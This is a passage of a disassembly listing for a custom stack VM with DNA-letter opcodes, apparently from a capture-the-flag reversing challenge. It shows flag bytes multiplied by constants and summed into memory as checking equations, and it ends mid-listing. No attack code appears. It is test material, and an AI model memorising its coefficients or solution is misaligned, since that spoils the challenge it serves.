push(#000000dc)\n004de : GT               push(pop() * pop())\n004e0 : GAAACGGAAAAA     push(mem[#02b0])\n004ec : AATAGGAAAAAA     push(#000000a1)\n004f8 : GT               push(pop() * pop())\n004fa : AT               push(pop() + pop())\n004fc : AT               push(pop() + pop())\n004fe : AT               push(pop() + pop())\n00500 : AT               push(pop() + pop())\n00502 : AT               push(pop() + pop())\n00504 : AT               push(pop() + pop())\n00506 : AT               push(pop() + pop())\n00508 : AT               push(pop() + pop())\n0050a : AT               push(pop() + pop())\n0050c : AT               push(pop() + pop())\n0050e : AT               push(pop() + pop())\n00510 : AT               push(pop() + pop())\n00512 : AT               push(pop() + pop())\n00514 : AT               push(pop() + pop())\n00516 : AT               push(pop() + pop())\n00518 : AT               push(pop() + pop())\n0051a : AT               push(pop() + pop())\n0051c : AT               push(pop() + pop())\n0051e : AT               push(pop() + pop())\n00520 : AT               push(pop() + pop())\n00522 : AT               push(pop() + pop())\n00524 : AT               push(pop() + pop())\n00526 : AT               push(pop() + pop())\n00528 : AT               push(pop() + pop())\n0052a : AT               push(pop() + pop())\n0052c : AT               push(pop() + pop())\n0052e : AT               push(pop() + pop())\n00530 : AT               push(pop() + pop())\n00532 : AT               push(pop() + pop())\n00534 : AT               push(pop() + pop())\n00536 : AT               push(pop() + pop())\n00538 : AT               push(pop() + pop())\n0053a : AT               push(pop() + pop())\n0053c : AT               push(pop() + pop())\n0053e : AT               push(pop() + pop())\n00540 : AT               push(pop() + pop())\n00542 : AT               push(pop() + pop())\n00544 : AT               push(pop() + pop())\n00546 : AT               push(pop() + pop())\n00548 : AT               push(pop() + pop())\n0054a : AT               push(pop() + pop())\n0054c : AT               push(pop() + pop())\n0054e : AT               push(pop() + pop())\n00550 : AT               push(pop() + pop())\n00552 : AT               push(pop() + pop())\n00554 : AT               push(pop() + pop())\n00556 : AT               push(pop() + pop())\n00558 : AT               push(pop() + pop())\n0055a : CAAAAAAATAAA     mem[#1000] := pop()           memory[#01000] := ((flag[0] * 106) + ((flag[1] * 27) + ((flag[2] * 140) + ((flag[3] * 138) + ((flag[4] * 108) + ((flag[5] * 91) + ((flag[6] * 131) + ((flag[7] * 138) + ((flag[8] * 106) + ((flag[9] * 127) + ((flag[10] * 161) + ((flag[11] * 115) + ((flag[12] * 177) + ((flag[13] * 152) + ((flag[14] * 15) + ((flag[15] * 55) + ((flag[16] * 230) + ((flag[17] * 131) + ((flag[18] * 147) + ((flag[19] * 183) + ((flag[20] * 235) + ((flag[21] * 197) + ((flag[22] * 200) + ((flag[23] * 104) + ((flag[24] * 188) + ((flag[25] * 196) + ((flag[26] * 118) + ((flag[27] * 28) + ((flag[28] * 21) + ((flag[29] * 97) + ((flag[30] * 151) + ((flag[31] * 217) + ((flag[32] * 118) + ((flag[33] * 22) + ((flag[34] * 212) + ((flag[35] * 31) + ((flag[36] * 101) + ((flag[37] * 227) + ((flag[38] * 155) + ((flag[39] * 237) + ((flag[40] * 146) + ((flag[41] * 68) + ((flag[42] * 75) + ((flag[43] * 71) + ((flag[44] * 218) + ((flag[45] * 173) + ((flag[46] * 41) + ((flag[47] * 220) + (flag[48] * 161)))))))))))))))))))))))))))))))))))))))))))))))))\n00566 : GAAAAGGAAAAA     push(mem[#0280])\n00572 : AAAGCAAAAAAA     push(#00000038)\n0057e : GT               push(pop() * pop())\n00580 : GATAAGGAAAAA     push(mem[#0281])\n0058c : AATGCCAAAAAA     push(#000000f9)\n00598 : GT               push(pop() * pop())\n0059a : GAGAAGGAAAAA     push(mem[#0282])\n005a6 : AAAGTGAAAAAA     push(#00000098)\n005b2 : GT               push(pop() * pop())\n005b4 : GACAAGGAAAAA     push(mem[#0283])\n005c0 : AATAGCAAAAAA     push(#000000e1)\n005cc : GT               push(pop() * pop())\n005ce : GAATAGGAAAAA     push(mem[#0284])\n005da : AAGAATAAAAAA     push(#00000042)\n005e6 : GT               push(pop() * pop())\n005e8 : GATTAGGAAAAA     push(mem[#0285])\n005f4 : AAAGAGAAAAAA     push(#00000088)\n00600 : GT               push(pop() * pop())\n00602 : GAGTAGGAAAAA     push(mem[#0286])\n0060e : AATACTAAAAAA     push(#00000071)\n0061a : GT               push(pop() * pop())\n0061c : GACTAGGAAAAA     push(mem[#0287])\n00628 : AACACCAAAAAA     push(#000000f3)\n00634 : GT               push(pop() * pop())\n00636 : GAAGAGGAAAAA     push(mem[#0288])\n00642 : AACCCAAAAAAA     push(#0000003f)\n0064e : GT               push(pop() * pop())\n00650 : GATGAGGAAAAA     push(mem[#0289])\n0065c : AATGGCAAAAAA     push(#000000e9)\n00668 : GT               push(pop() * pop())\n0066a : GAGGAGGAAAAA     push(mem[#028a])\n00676 : AAGCCCAAAAAA     push(#000000fe)\n00682 : GT               push(pop() * pop())\n00684 : GACGAGGAAAAA     push(mem[#028b])\n00690 : AATTATAAAAAA     push(#00000045)\n0069c : GT               push(pop() * pop())\n0069e : GAACAGGAAAAA     push(mem[#028c])\n006aa : AACCCGAAAAAA     push(#000000bf)\n006b6 : GT               push(pop() * pop())\n006b8 : GATCAGGAAAAA     push(mem[#028d])\n006c4 : AATAAAAAAAAA     push(#00000001)\n006d0 : GT               push(pop() * pop())\n006d2 : GAGCAGGAAAAA     push(mem[#028e])\n006de : AACATGAAAAAA     push(#00000093)\n006ea : GT               push(pop() * pop())\n006ec : GACCAGGAAAAA     push(mem[#028f])\n006f8 : AATGGGAAAAAA     push(#000000a9)\n00704 : GT               push(pop() * pop())\n00706 : GAAATGGAAAAA     push(mem[#0290])\n00712 : AAGTCTAAAAAA     push(#00000076)\n0071e : GT               push(pop() * pop())\n00720 : GATATGGAAAAA     push(mem[#0291])\n0072c : AATAGTAAAAAA     push(#00000061)\n00738 : GT               push(pop() * pop())\n0073a : GAGATGGAAAAA     push(mem[#0292])\n00746 : AATAACAAAAAA     push(#000000c1)\n00752 : GT               push(pop() * pop())\n00754 : GACATGGAAAAA     push(mem[#0293])\n00760 : AACCGGAAAAAA     push(#000000af)\n0076c : GT               push(pop() * pop())\n0076e : GAATTGGAAAAA     push(mem[#0294])\n0077a : AATGTAAAAAAA     push(#00000019)\n00786 : GT               push(pop() * pop())\n00788 : GATTTGGAAAAA     push(mem[#0295])\n00794 : AATCAGAAAAAA     push(#0000008d)\n007a0 : GT               push(pop() * pop())\n007a2 : GAGTTGGAAAAA     push(mem[#0296])\n007ae : AAGGGCAAAAAA     push(#000000ea)\n007ba : GT               push(pop() * pop())\n007bc : GACTTGGAAAAA     push(mem[#0297])\n007c8 : AATGGTAAAAAA     push(#00000069)\n007d4 : GT               push(pop() * pop())\n007d6 : GAAGTGGAAAAA     push(mem[#0298])\n007e2 : AATGAAAAAAAA     push(#00000009)\n007ee : GT               push(pop() * pop())\n007f0 : GATGTGGAAAAA     push(mem[#0299])\n007fc : AATTCAAAAAAA     push(#00000035)\n00808 : GT               push(pop() * pop())\n0080a : GAGGTGGAAAAA     push(mem[#029a])\n00816 : AACACTAAAAAA     push(#00000073)\n00822 : GT               push(pop() * pop())\n00824 : GACGTGGAAAAA     push(mem[#029b])\n00830 : AAGAGGAAAAAA     push(#000000a2)\n0083c : GT               push(pop() * pop())\n0083e : GAACTGGAAAAA     push(mem[#029c])\n0084a : AAAGGTAAAAAA     push(#00000068)\n00856 : GT               push(pop() * pop())\n00858 : GATCTGGAAAAA     push(mem[#029d])\n00864 : AAAGGTAAAAAA     push(#00000068)\n00870 : GT               push(pop() * pop())\n00872 : GAGCTGGAAAAA     push(mem[#029e])\n0087e : AATGTGAAAAAA     push(#00000099)\n0088a : GT               push(pop() * pop())\n0088c : GACCTGGAAAAA     push(mem[#029f])\n00898 : AATGCAAAAAAA     push(#00000039)\n008a4 : GT               push(pop() * pop())\n008a6 : GAAAGGGAAAAA     push(mem[#02a0])\n008b2 : AACGAAAAAAAA     push(#0000000b)\n008be : GT               push(pop() * pop())\n008c0 : GATAGGGAAAAA     push(mem[#02a1])\n008cc : AAACTAAAAAAA     push(#0000001c)\n008d8 : GT               push(pop() * pop())\n008da : GAGAGGGAAAAA     push(mem[#02a2])\n008e6 : AACAAAAAAAAA     push(#00000003)\n008f2 : GT               push(pop() * pop())\n008f4 : GACAGGGAAAAA     push(mem[#02a3])\n00900 : AAGATGAAAAAA     push(#00000092)\n0090c : GT               push(pop() * pop())\n0090e : GAATGGGAAAAA     push(mem[#02a4])\n0091a : AAGCAAAAAAAA     push(#0000000e)\n00926 : GT               push(pop() * pop())\n00928 : GATTGGGAAAAA     push(mem[#02a5])\n00934 : AAGTATAAAAAA     push(#00000046)\n00940 : GT               push(pop() * pop())\n00942 : GAGTGGGAAAAA     push(mem[#02a6])\n0094e : AAGGTGAAAAAA     push(#0000009a)\n0095a : GT               push(pop() * pop())\n0095c : GACTGGGAAAAA     push(mem[#02a7])\n00968 : AAGTGTAAAAAA     push(#00000066)\n00974 : GT               push(pop() * pop())\n00976 : GAAGGGGAAAAA     push(mem[#02a8])\n00982 : AATGGGAAAAAA     push(#000000a9)\n0098e : GT               push(pop() * pop())\n00990 : GATGGGGAAAAA     push(mem[#02a9])\n0099c : AAGAATAAAAAA     push(#00000042)\n009a8 : GT               push(pop() * pop())\n009aa : GAGGGGGAAAAA     push(mem[#02aa])\n009b6 : AATTAGAAAAAA     push(#00000085)\n009c2 : GT               push(pop() * pop())\n009c4 : GACGGGGAAAAA     push(mem[#02ab])\n009d0 : AATCTAAAAAAA     push(#0000001d)\n009dc : GT               push(pop() * pop())\n009de : GAACGGGAAAAA     push(mem[#02ac])\n009ea : AACGGTAAAAAA     push(#0000006b)\n009f6 : GT               push(pop() * pop())\n009f8 : GATCGGGAAAAA     push(mem[#02ad])\n00a04 : AACGTGAAAAAA     push(#0000009b)\n00a10 : GT               push(pop() * pop())\n00a12 : GAGCGGGAAAAA     push(mem[#02ae])\n00a1e : AAGTTAAAAAAA     push(#00000016)\n00a2a : GT               push(pop() * pop())\n00a2c : GACCGGGAAAAA     push(mem[#02af])\n00a38 : AACTGCAAAAAA     push(#000000e7)\n00a44 : GT               push(pop() * pop())\n00a46 : GAAACGGAAAAA     push(mem[#02b0])\n00a52 : AATCCAAAAAAA     push(#0000003d)\n00a5e : GT               push(pop() * pop())\n00a60 : AT               push(pop() + pop())\n00a62 : AT               push(pop() + pop())\n00a64 : AT               push(pop() + pop())\n00a66 : AT               push(pop() + pop())\n00a68 : AT               push(pop() + pop())\n00a6a : AT               push(pop() + pop())\n00a6c : AT               push(pop() + pop())\n00a6e : AT               push(pop() + pop())\n00a70 : AT               push(pop() + pop())\n00a72 : AT               push(pop() + pop())\n00a74 : AT               push(pop() + pop())\n00a76 : AT               push(pop() + pop())\n00a78 : AT               push(pop() + pop())\n00a7a : AT               push(pop() + pop())\n00a7c : AT               push(pop() + pop())\n00a7e : AT               push(pop() + pop())\n00a80 : AT               push(pop() + pop())\n00a82 : AT               push(pop() + pop())\n00a84 : AT               push(pop() + pop())\n00a86 : AT               push(pop() + pop())\n00a88 : AT               push(pop() + pop())\n00a8a : AT               push(pop() + pop())\n00a8c : AT               push(pop() + pop())\n00a8e : AT               push(pop() + pop())\n00a90 : AT               push(pop() + pop())\n00a92 : AT               push(pop() + pop())\n00a94 : AT               push(pop() + pop())\n00a96 : AT               push(pop() + pop())\n00a98 : AT               push(pop() + pop())\n00a9a : AT               push(pop() + pop())\n00a9c : AT               push(pop() + pop())\n00a9e : AT               push(pop() + pop())\n00aa0 : AT               push(pop() + pop())\n00aa2 : AT               push(pop() + pop())\n00aa4 : AT               push(pop() + pop())\n00aa6 : AT               push(pop() + pop())\n00aa8 : AT               push(pop() + pop())\n00aaa : AT               push(pop() + pop())\n00aac : AT               push(pop() + pop())\n00aae : AT               push(pop() + pop())\n00ab0 : AT               push(pop() + pop())\n00ab2 : AT               push(pop() + pop())\n00ab4 : AT               push(pop() + pop())\n00ab6 : AT               push(pop() + pop())\n00ab8 : AT               push(pop() + pop())\n00aba : AT               push(pop() + pop())\n00abc : AT               push(pop() + pop())\n00abe : AT               push(pop() + pop())\n00ac0 : CAATAAAATAAA     mem[#1004] := pop()           memory[#01004] := ((flag[0] * 56) + ((flag[1] * 249) + ((flag[2] * 152) + ((flag[3] * 225) + ((flag[4] * 66) + ((flag[5] * 136) + ((flag[6] * 113) + ((flag[7] * 243) + ((flag[8] * 63) + ((flag[9] * 233) + ((flag[10] * 254) + ((flag[11] * 69) + ((flag[12] * 191) + ((flag[13] * 1) + ((flag[14] * 147) + ((flag[15] * 169) + ((flag[16] * 118) + ((flag[17] * 97) + ((flag[18] * 193) + ((flag[19] * 175) + ((flag[20] * 25) + ((flag[21] * 141) + ((flag[22] * 234) + ((flag[23] * 105) + ((flag[24] * 9) + ((flag[25] * 53) + ((flag[26] * 115) + ((flag[27] * 162) + ((flag[28] * 104) + ((flag[29] * 104) + ((flag[30] * 153) + ((flag[31] * 57) + ((flag[32] * 11) + ((flag[33] * 28) + ((flag[34] * 3) + ((flag[35] * 146) + ((flag[36] * 14) + ((flag[37] * 70) + ((flag[38] * 154) + ((flag[39] * 102) + ((flag[40] * 169) + ((flag[41] * 66) + ((flag[42] * 133) + ((flag[43] * 29) + ((flag[44] * 107) + ((flag[45] * 155) + ((flag[46] * 22) + ((flag[47] * 231) + (flag[48] * 61)))))))))))))))))))))))))))))))))))))))))))))))))\n00acc : GAAAAGGAAAAA     push(mem[#0280])\n00ad8 : AATTTGAAAAAA     push(#00000095)\n00ae4 : GT               push(pop() * pop())\n00ae6 : GATAAGGAAAAA     push(mem[#0281])\n00af2 : AAAGGTAAAAAA     push(#00000068)\n00afe : GT               push(pop() * pop())\n00b00 : GAGAAGGAAAAA     push(mem[#0282])\n00b0c : AAGAATAAAAAA     push(#00000042)\n00b18 : GT               push(pop() * pop())\n00b1a : GACAAGGAAAAA     push(mem[#0283])\n00b26 : AAAGATAAAAAA     push(#00000048)\n00b32 : GT               push(pop() * pop())\n00b34 : GAATAGGAAAAA     push(mem[#0284])\n00b40 : AAACAGAAAAAA     push(#0000008c)\n00b4c : GT               push(pop() * pop())\n00b4e : GATTAGGAAAAA     push(mem[#0285])\n00b5a : AAGTAGAAAAAA     push(#00000086)\n00b66 : GT               push(pop() * pop())\n00b68 : GAGTAGGAAAAA     push(mem[#0286])\n00b74 : AAACAGAAAAAA     push(#0000008c)\n00b80 : GT               push(pop() * pop())\n00b82 : GACTAGGAAAAA     push(mem[#0287])\n00b8e : AAGCGGAAAAAA     push(#000000ae)\n00b9a : GT               push(pop() * pop())\n00b9c : GAAGAGGAAAAA     push(mem[#0288])\n00ba8 : AAACGCAAAAAA     push(#000000ec)\n00bb4 : GT               push(pop() * pop())\n00bb6 : GATGAGGAAAAA     push(mem[#0289])\n00bc2 : AAGGAAAAAAAA     push(#0000000a)\n00bce : GT               push(pop() * pop())\n00bd0 : GAGGAGGAAAAA     push(mem[#028a])\n00bdc : AATATCAAAAAA     push(#000000d1)\n00be8 : GT               push(pop() * pop())\n00bea : GACGAGGAAAAA     push(mem[#028b])\n00bf6 : AAGAGGAAAAAA     push(#000000a2)\n00c02 : GT               push(pop() * pop())\n00c04 : GAACAGGAAAAA     push(mem[#028c])\n00c10 : AACCAAAAAAAA     push(#0000000f)\n00c1c : GT               push(pop() * pop())\n00c1e : GATCAGGAAAAA     push(mem[#028d])\n00c2a : AACCTCAAAAAA     push(#000000df)\n00c36 : GT               push(pop() * pop())\n00c38 : GAGCAGGAAAAA     push(mem[#028e])\n00c44 : AACCCGAAAAAA     push(#000000bf)\n00c50 : GT               push(pop() * pop())\n00c52 : GACCAGGAAAAA     push(mem[#028f])\n00c5e : AACTCGAAAAAA     push(#000000b7)\n00c6a : GT               push(pop() * pop())\n00c6c : GAAATGGAAAAA     push(mem[#0290])\n00c78 : AATCATAAAAAA     push(#0000004d)\n00c84 : GT               push(pop() * pop())\n00c86 : GATATGGAAAAA     push(mem[#0291])\n00c92 : AATGAGAAAAAA     push(#00000089)\n00c9e : GT               push(pop() * pop())\n00ca0 : GAGATGGAAAAA     push(mem[#0292])\n00cac : AAGGGTAAAAAA     push(#0000006a)\n00cb8 : GT               push(pop() * pop())\n00cba : GACATGGAAAAA     push(mem[#0293])\n00cc6 : AATTATAAAAAA     push(#00000045)\n00cd2 : GT               push(pop() * pop())\n00cd4 : GAATTGGAAAAA     push(mem[#0294])\n00ce0 : AAGTCAAAAAAA     push(#00000036)\n00cec : GT               push(pop() * pop())\n00cee : GATTTGGAAAAA     push(mem[#0295])\n00cfa : AATAAAAAAAAA     push(#00000001)\n00d06 : GT               push(pop() * pop())\n00d08 : GAGTTGGAAAAA     push(mem[#0296])\n00d14 : AAGGCTAAAAAA     push(#0000007a)\n00d20 : GT               push(pop() * pop())\n00d22 : GACTTGGAAAAA     push(mem[#0297])\n00d2e : AACAACAAAAAA     push(#000000c3)\n00d3a : GT               push(pop() * pop())\n00d3c : GAAGTGGAAAAA     push(mem[#0298])\n00d48 : AAGCCAAAAAAA     push(#0000003e)\n00d54 : GT               push(pop() * pop())\n00d56 : GATGTGGAAAAA     push(mem[#0299])\n00d62 : AACAGTAAAAAA     push(#00000063)\n00d6e : GT               push(pop() * pop())\n00d70 : GAGGTGGAAAAA     push(mem[#029a])\n00d7c : AACGTGAAAAAA     push(#0000009b)\n00d88 : GT               push(pop() * pop())\n00d8a : GACGTGGAAAAA     push(mem[#029b])\n00d96 : AAGGAAAAAAAA     push(#0000000a)\n00da2 : GT               push(pop() * pop())\n00da4 : GAACTGGAAAAA     push(mem[#029c])\n00db0 : AAGATAAAAAAA     push(#00000012)\n00dbc : GT               push(pop() * pop())\n00dbe : GATCTGGAAAAA     push(mem[#029d])\n00dca : AATTCTAAAAAA     push(#00000075)\n00dd6 : GT               push(pop() * pop())\n00dd8 : GAGCTGGAAAAA     push(mem[#029e])\n00de4 : AAATGGAAAAAA     push(#000000a4)\n00df0 : GT               push(pop() * pop())\n00df2 : GACCTGGAAAAA     push(mem[#029f])\n00dfe : AAAGTCAAAAAA     push(#000000d8)\n00e0a : GT               push(pop() * pop())\n00e0c : GAAAGGGAAAAA     push(mem[#02a0])\n00e18 : AACTGCAAAAAA     push(#000000e7)\n00e24 : GT               push(pop() * pop())\n00e26 : GATAGGGAAAAA     push(mem[#02a1])\n00e32 : AAGTTGAAAAAA     push(#00000096)\n00e3e : GT               push(pop() * pop())\n00e40 : GAGAGGGAAAAA     push(mem[#02a2])\n00e4c : AACCCCAAAAAA     push(#000000ff)\n00e58 : GT               push(pop() * pop())\n00e5a : GACAGGGAAAAA     push(mem[#02a3])\n00e66 : AACCCTAAAAAA     push(#0000007f)\n00e72 : GT               push(pop() * pop())\n00e74 : GAATGGGAAAAA     push(mem[#02a4])\n00e80 : AATAACAAAAAA     push(#000000c1)\n00e8c : GT               push(pop() * pop())\n00e8e : GATTGGGAAAAA     push(mem[#02a5])\n00e9a : AATATGAAAAAA     push(#00000091)\n00ea6 : GT               push(pop() * pop())\n00ea8 : GAGTGGGAAAAA     push(mem[#02a6])\n00eb4 : AAGCCGAAAAAA     push(#000000be)\n00ec0 : GT               push(pop() * pop())\n00ec2 : GACTGGGAAAAA     push(mem[#02a7])\n00ece : AAGAGAAAAAAA     push(#00000022)\n00eda : GT               push(pop() * pop())\n00edc : GAAGGGGAAAAA     push(mem[#02a8])\n00ee8 : AAGCGAAAAAAA     push(#0000002e)\n00ef4 : GT               push(pop() * pop())\n00ef6 : GATGGGGAAAAA     push(mem[#02a9])\n00f02 : AAAAATAAAAAA     push(#00000040)\n00f0e : GT               push(pop() * pop())\n00f10 : GAGGGGGAAAAA     push(mem[#02aa])\n00f1c : AATCCGAAAAAA     push(#000000bd)\n00f28 : GT               push(pop() * pop())\n00f2a : GACGGGGAAAAA     push(mem[#02ab])\n00f36 : AAGTCGAAAAAA     push(#000000b6)\n00f42 : GT               push(pop() * pop())\n00f44 : GAACGGGAAAAA     push(mem[#02ac])\n00f50 : AACGTAAAAAAA     push(#0000001b)\n00f5c : GT               push(pop() * pop())\n00f5e : GATCGGGAAAAA     push(mem[#02ad])\n00f6a : AACAGGAAAAAA     push(#000000a3)\n00f76 : GT               push(pop() * pop())\n00f78 : GAGCGGGAAAAA     push(mem[#02ae])\n00f84 : AAACTGAAAAAA     push(#0000009c)\n00f90 : GT               push(pop() * pop())\n00f92 : GACCGGGAAAAA     push(mem[#02af])\n00f9e : AAACTGAAAAAA     push(#0000009c)\n00faa : GT               push(pop() * pop())\n00fac : GAAACGGAAAAA     push(mem[#02b0])\n00fb8 : AAGTTGAAAAAA     push(#00000096)\n00fc4 : GT               push(pop() * pop())\n00fc6 : AT               push(pop() + pop())\n00fc8 : AT               push(pop() + pop())\n00fca : AT               push(pop() + pop())\n00fcc : AT               push(pop() + pop())\n00fce : AT               push(pop() + pop())\n00fd0 : AT               push(pop() + pop())\n00fd2 : AT               push(pop() + pop())\n00fd4 : AT               push(pop() + pop())\n00fd6 : AT               push(pop() + pop())\n00fd8 : AT               push(pop() + pop())\n00fda : AT               push(pop() + pop())\n00fdc : AT               push(pop() + pop())\n00fde : AT               push(pop() + pop())\n00fe0 : AT               push(pop() + pop())\n00fe2 : AT               push(pop() + pop())\n00fe4 : AT               push(pop() + pop())\n00fe6 : AT               push(pop() + pop())\n00fe8 : AT               push(pop() + pop())\n00fea : AT               push(pop() + pop())\n00fec : AT               push(pop() + pop())\n00fee : AT               push(pop() + pop())\n00ff0 : AT               push(pop() + pop())\n00ff2 : AT               push(pop() + pop())\n00ff4 : AT               push(pop() + pop())\n00ff6 : AT               push(pop() + pop())\n00ff8 : AT               push(pop() + pop())\n00ffa : AT               push(pop() + pop())\n00ffc : AT               push(pop() + pop())\n00ffe : AT               push(pop() + pop())\n01000 : AT               push(pop() + pop())\n01002 : AT               push(pop() + pop())\n01004 : AT               push(pop() + pop())\n01006 : AT               push(pop() + pop())\n01008 : AT               push(pop() + pop())\n0100a : AT               push(pop() + pop())\n0100c : AT               push(pop() + pop())\n0100e : AT               push(pop() + pop())\n01010 : AT               push(pop() + pop())\n01012 : AT               push(pop() + pop())\n01014 : AT               push(pop() + pop())\n01016 : AT               push(pop() + pop())\n01018 : AT               push(pop() + pop())\n0101a : AT               push(pop() + pop())\n0101c : AT               push(pop() + pop())\n0101e : AT               push(pop() + pop())\n01020 : AT               push(pop() + pop())\n01022 : AT               push(pop() + pop())\n01024 : AT               push(pop() + pop())\n01026 : CAAGAAAATAAA     mem[#1008] := pop()           memory[#01008] := ((flag[0] * 149) + ((flag[1] * 104) + ((flag[2] * 66) + ((flag[3] * 72) + ((flag[4] * 140) + ((flag[5] * 134) + ((flag[6] * 140) + ((flag[7] * 174) + ((flag[8] * 236) + ((flag[9] * 10) + ((flag[10] * 209) + ((flag[11] * 162) + ((flag[12] * 15) + ((flag[13] * 223) + ((flag[14] * 191) + ((flag[15] * 183) + ((flag[16] * 77) + ((flag[17] * 137) + ((flag[18] * 106) + ((flag[19] * 69) + ((flag[20] * 54) + ((flag[21] * 1) + ((flag[22] * 122) + ((flag[23] * 195) + ((flag[24] * 62) + ((flag[25] * 99) + ((flag[26] * 155) + ((flag[27] * 10) + ((flag[28] * 18) + ((flag[29] * 117) + ((flag[30] * 164) + ((flag[31] * 216) + ((flag[32] * 231) + ((flag[33] * 150) + ((flag[34] * 255) + ((flag[35] * 127) + ((flag[36] * 193) + ((flag[37] * 145) + ((flag[38] * 190) + ((flag[39] * 34) + ((flag[40] * 46) + ((flag[41] * 64) + ((flag[42] * 189) + ((flag[43] * 182) + ((flag[44] * 27) + ((flag[45] * 163) + ((flag[46] * 156) + ((flag[47] * 156) + (flag[48] * 150)))))))))))))))))))))))))))))))))))))))))))))))))\n01032 : GAAAAGGAAAAA     push(mem[#0280])\n0103e : AACAATAAAAAA     push(#00000043)\n0104a : GT               push(pop() * pop())\n0104c : GATAAGGAAAAA     push(mem[#0281])\n01058 : AATACTAAAAAA     push(#00000071)\n01064 : GT               push(pop() * pop())\n01066 : GAGAAGGAAAAA     push(mem[#0282])\n01072 : AAACCGAAAAAA     push(#000000bc)\n0107e : GT               push(pop() * pop())\n01080 : GACAAGGAAAAA     push(mem[#0283])\n0108c : AATCAAAAAAAA     push(#0000000d)\n01098 : GT               push(pop() * pop())\n0109a : GAATAGGAAAAA     push(mem[#0284])\n010a6 : AATCGGAAAAAA     push(#000000ad)\n010b2 : GT               push(pop() * pop())\n010b4 : GATTAGGAAAAA     push(mem[#0285])\n010c0 : AATAAAAAAAAA     push(#00000001)\n010cc : GT               push(pop() * pop())\n010ce : GAGTAGGAAAAA     push(mem[#0286])\n010da : AACACTAAAAAA     push(#00000073)\n010e6 : GT               push(pop() * pop())\n010e8 : GACTAGGAAAAA     push(mem[#0287])\n010f4 : AAACCGAAAAAA     push(#000000bc)\n01100 : GT               push(pop() * pop())\n01102 : GAAGAGGAAAAA     push(mem[#0288])\n0110e : AACTTGAAAAAA     push(#00000097)\n0111a : GT               push(pop() * pop())\n0111c : GATGAGGAAAAA     push(mem[#0289])\n01128 : AAGGAAAAAAAA     push(#0000000a)\n01134 : GT               push(pop() * pop())\n01136 : GAGGAGGAAAAA     push(mem[#028a])\n01142 : AAACCGAAAAAA     push(#000000bc)\n0114e : GT               push(pop() * pop())\n01150 : GACGAGGAAAAA     push(mem[#028b])\n0115c : AAGCTAAAAAAA     push(#0000001e)\n01168 : GT               push(pop() * pop())\n0116a : GAACAGGAAAAA     push(mem[#028c])\n01176 : AAGGATAAAAAA     push(#0000004a)\n01182 : GT               push(pop() * pop())\n01184 : GATCAGGAAAAA     push(mem[#028d])\n01190 : AAAAGCAAAAAA     push(#000000e0)\n0119c : GT               push(pop() * pop())\n0119e : GAGCAGGAAAAA     push(mem[#028e])\n011aa : AACCGGAAAAAA     push(#000000af)\n011b6 : GT               push(pop() * pop())\n011b8 : GACCAGGAAAAA     push(mem[#028f])\n011c4 : AAGGGGAAAAAA     push(#000000aa)\n011d0 : GT               push(pop() * pop())\n011d2 : GAAATGGAAAAA     push(mem[#0290])\n011de : AAACCAAAAAAA     push(#0000003c)\n011ea : GT               push(pop() * pop())\n011ec : GATATGGAAAAA     push(mem[#0291])\n011f8 : AACGGAAAAAAA     push(#0000002b)\n01204 : GT               push(pop() * pop())\n01206 : GAGATGGAAAAA     push(mem[#0292])\n01212 : AAACCGAAAAAA     push(#000000bc)\n0121e : GT               push(pop() * pop())\n01220 : GACATGGAAAAA     push(mem[#0293])\n0122c : AAGAGGAAAAAA     push(#000000a2)\n01238 : GT               push(pop() * pop())\n0123a : GAATTGGAAAAA     push(mem[#0294])\n01246 : AATTTTAAAAAA     push(#00000055)\n01252 : GT               push(pop() * pop())\n01254 : GATTTGGAAAAA     push(mem[#0295])\n01260 : AAAATAAAAAAA     push(#00000010)\n0126c : GT               push(pop() * pop())\n0126e : GAGTTGGAAAAA     push(mem[#0296])\n0127a : AAACTAAAAAAA     push(#0000001c)\n01286 : GT               push(pop() * pop())\n01288 : GACTTGGAAAAA     push(mem[#0297])\n01294 : AAAATTAAAAAA     push(#00000050)\n012a0 : GT               push(pop() * pop())\n012a2 : GAAGTGGAAAAA     push(mem[#0298])\n012ae : AAATAAAAAAAA     push(#00000004)\n012ba : GT               push(pop() * pop())\n012bc : GATGTGGAAAAA     push(mem[#0299])\n012c8 : AAAAGAAAAAAA     push(#00000020)\n012d4 : GT               push(pop() * pop())\n012d6 : GAGGTGGAAAAA     push(mem[#029a])\n012e2 : AACATTAAAAAA     push(#00000053)\n012ee : GT               push(pop() * pop())\n012f0 : GACGTGGAAAAA     push(mem[#029b])\n012fc : AAACTGAAAAAA     push(#0000009c)\n01308 : GT               push(pop() * pop())\n0130a : GAACTGGAAAAA     push(mem[#029c])\n01316 : AATCGGAAAAAA     push(#000000ad)\n01322 : GT               push(pop() * pop())\n01324 : GATCTGGAAAAA     push(mem[#029d])\n01330 : AAGCTCAAAAAA     push(#000000de)\n0133c : GT               push(pop() * pop())\n0133e : GAGCTGGAAAAA     push(mem[#029e])\n0134a : AAACTTAAAAAA     push(#0000005c)\n01356 : GT               push(pop() * pop())\n01358 : GACCTGGAAAAA     push(mem[#029f])\n01364 : AATGGTAAAAAA     push(#00000069)\n01370 : GT               push(pop() * pop())\n01372 : GAAAGGGAAAAA     push(mem[#02a0])\n0137e : AACGCCAAAAAA     push(#000000fb)\n0138a : GT               push(pop() * pop())\n0138c : GATAGGGAAAAA     push(mem[#02a1])\n01398 : AAGGTCAAAAAA     push(#000000da)\n013a4 : GT               push(pop() * pop())\n013a6 : GAGAGGGAAAAA     push(mem[#02a2])\n013b2 : AAATCGAAAAAA     push(#000000b4)\n013be : GT               push(pop() * pop())\n013c0 : GACAGGGAAAAA     push(mem[#02a3])\n013cc : AACGATAAAAAA     push(#0000004b)\n013d8 : GT               push(pop() * pop())\n013da : GAATGGGAAAAA     push(mem[#02a4])\n013e6 : AAGGCTAAAAAA     push(#0000007a)\n013f2 : GT               push(pop() * pop())\n013f4 : GATTGGGAAAAA     push(mem[#02a5])\n01400 : AACTAAAAAAAA     push(#00000007)\n0140c : GT               push(pop() * pop())\n0140e : GAGTGGGAAAAA     push(mem[#02a6])\n0141a : AACGAAAAAAAA     push(#0000000b)\n01426 : GT               push(pop() * pop())\n01428 : GACTGGGAAAAA     push(mem[#02a7])\n01434 : AAATATAAAAAA     push(#00000044)\n01440 : GT               push(pop() * pop())\n01442 : GAAGGGGAAAAA     push(mem[#02a8])\n0144e : AAGGTAAAAAAA     push(#0000001a)\n0145a : GT               push(pop() * pop())\n0145c : GATGGGGAAAAA     push(mem[#02a9])\n01468 : AAACAGAAAAAA     push(#0000008c)\n01474 : GT               push(pop() * pop())\n01476 : GAGGGGGAAAAA     push(mem[#02aa])\n01482 : AAGGCTAAAAAA     push(#0000007a)\n0148e : GT               